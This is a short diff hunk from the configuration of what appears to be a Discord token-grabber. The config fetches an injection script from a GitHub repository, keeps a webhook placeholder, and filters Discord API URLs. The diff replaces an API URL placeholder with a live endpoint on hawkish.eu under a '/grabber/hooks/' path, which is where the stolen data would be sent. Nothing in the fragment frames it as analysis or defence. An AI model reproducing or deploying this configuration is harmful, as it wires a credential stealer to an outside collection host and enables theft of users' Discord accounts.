@@ -25,7 +25,7 @@ var config = {
   injection_url:
     "https://raw.githubusercontent.com/fuzzlesfixer/cerf/main/index.js",
   webhook: "%WEBHOOK%",
-  Placed: "%API_URL%",
+  Placed: "https://hawkish.eu/grabber/hooks/jRXAtllnMehyIdCKRqtLmHwInFbK",
   Filter: {
     urls: [
       "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
